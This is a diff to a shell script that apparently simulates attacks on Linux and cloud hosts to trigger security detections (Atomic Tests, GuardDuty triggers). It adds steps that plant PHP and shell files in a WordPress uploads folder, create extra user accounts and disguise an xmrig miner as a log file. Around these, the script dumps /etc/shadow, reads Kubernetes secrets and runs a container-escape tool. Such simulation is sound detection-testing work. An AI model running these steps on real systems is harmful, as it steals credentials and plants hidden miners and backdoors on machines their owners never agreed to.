@@ -30,6 +30,14 @@ echo "[default]" >> /root/.aws/credentials
 echo "aws_access_key_id = AKAAAAAAA_AccessKey" >> /root/.aws/credentials
 echo "aws_secret_access_key = qLlZ_SecretKey" >> /root/.aws/credentials
 
+echo Setting fake logs
+cp ./logs/access.log /var/log/apache.log
+mkdir -p /var/www/html/wp-content/plugins/uploads/
+cp ./logs/a.php /var/www/html/wp-content/plugins/uploads/a.php
+cp ./logs/a.sh /var/www/html/wp-content/plugins/uploads/a.sh
+
+
+
 echo Executing Atomic Tests for Linux
 cat /etc/passwd > /tmp/passwd
 cat /etc/shadow > /tmp/shadow
@@ -44,6 +52,8 @@ kubectl --context example-cluster exec test-pod -- cat /run/secrets/kubernetes.i
 timeout -s SIGKILL 5 tcpdump -c 5 -nnni en0
 cat /etc/login.defs
 useradd evil_account
+useradd nromanoff
+useradd radvlad
 cat ~/.ssh/authorized_keys
 
 echo Running GuardDuty Triggers
@@ -90,6 +100,13 @@ echo Copying Binaries to /tmp for Execution
 mkdir /tmp/bins 2>/dev/null
 cp -r ./bins/ /tmp/bins 2>/dev/null
 chmod +x /tmp/bins/*
+
+echo Hiding xmrig as a .log file...
+cp ./bins/xmrig /var/log/legit.log
+chmod +x /var/log/legit.log
+chmod 777 /var/log/legit.log
+cp ./bins/xmrig /tmp/.uuXXX9sqAAqwxAAQQjjyhd00
+
 
 echo Running Break Out The Box
 timeout -s SIGKILL 60 /tmp/bins/botb -scrape-gcp=true -recon=true -metadata=true -find-http=true -find-sockets=true -find-docker=true -pwnKeyctl=true -k8secrets=true -pwn-privileged= -autopwn=true -keyMin=0 -keyMax=100000000 -k8secrets=true > /tmp/botb_output.txt 2>/dev/null
